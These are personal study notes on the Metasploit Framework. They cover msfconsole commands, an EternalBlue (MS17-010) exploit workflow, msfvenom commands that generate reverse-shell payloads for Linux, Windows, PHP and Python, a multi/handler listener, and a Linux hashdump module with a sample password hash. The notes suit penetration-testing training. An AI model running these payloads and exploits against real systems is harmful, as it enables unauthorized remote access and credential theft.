# Metasploit & Msfvenom Notes

## Overview
This document provides a concise summary of key concepts, commands, and tools used when working with **Metasploit Framework**, **msfconsole**, **msfvenom**, and **payload handlers**. The purpose of these notes is to serve as a future reference for learning, exploitation workflow, payload generation, and session handling.

---

## Metasploit Exploitation Framework
Metasploit is an exploitation platform that contains:
- Exploits  
- Auxiliary modules  
- Post-exploitation modules  
- Payloads  
- Encoders  
- NOP generators  

Useful commands:
```
search <term>        # Search for modules
use <module>         # Load a module
info                 # Show info for the loaded module
show options         # Display required settings for module
show payloads        # List compatible payloads
set <option> <value> # Configure module options
exploit / run        # Execute the module
sessions             # Show active sessions
sessions -i <id>     # Interact with a specific session
```

### Key Notes
- Many exploits include default payloads.
- Reverse payloads require setting `LHOST` and `LPORT`.
- Successful exploitation opens a session (shell or Meterpreter).
- Sessions can be backgrounded using `CTRL+Z`.

---
## Core Metasploit Commands

### Module Discovery
```
search <keyword>       # Search any module
```

### Load a Module
```
use <module_path>
use exploit/windows/smb/ms17_010_eternalblue
```

### Module Information
```
info
show options
show payloads
```

### Set Options
```
set RHOSTS <target>
set RPORT <port>
set LHOST <your_IP>
set LPORT <your_listener_port>
```

### Run Exploit
```
exploit
run
```

### Sessions Handling
```
sessions
sessions -i <id>
sessions -k <id>
sessions -u <id>      # Upgrade to Meterpreter when possible
```
---

## Using an Exploit With a Payload
Below is a full workflow on how to combine an **exploit module** and a **payload**, using MS17-010 (EternalBlue) as an example.

### Display Required Options
```
show options
```

Expected options:
- **RHOSTS** – Target machine
- **RPORT** – SMB port (445)
- **SMBDomain**, **SMBUser**, **SMBPass** (optional)
- Payload options depending on chosen payload


### Show Compatible Payloads
```
show payloads
```

Examples of valid payloads:
- `windows/x64/meterpreter/reverse_tcp`
- `generic/shell_reverse_tcp`
- `windows/x64/exec`

---

## Payload Generation with Msfvenom
`msfvenom` replaces the old `msfpayload` and `msfencode` utilities.  
It generates payloads for a wide variety of formats and platforms.

List available payloads:
```
msfvenom -l payloads
```

List output formats:
```
msfvenom -l formats
```

List encoders:
```
msfvenom -l encoders
```

### Common Payload Examples

**Linux ELF**
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf
```

**Windows EXE**
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe
```

**PHP Reverse Shell**
```
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
```

**Python Reverse Shell**
```
msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw > shell.py
```

### Important Notes for PHP Payloads
- The generated file may omit `<?php` and `?>`
- Must manually add:
```
<?php
# payload ...
?>
```

---

## Handler Setup (exploit/multi/handler)
Used to **catch reverse shells** generated by msfvenom or exploits.

Load handler:
```
use exploit/multi/handler
```

Set payload and listener options:
```
set payload <payload>
set LHOST <IP>
set LPORT <PORT>
run
```

The handler will wait for connections from the target and open a session.


---

## Linux Post-Exploitation (Hash Dumping)
```
run post/linux/gather/hashdump
```

Example discovered hash:
```
$6$Sy0NNIXw$SJ27WltHI89hwM5UxqVGiXidj94QFRm2Ynp9p9kxgVbjrmtMez9EqXoDWtcQd8rf0tjc77hBFbWxjGmQCTbep0
```
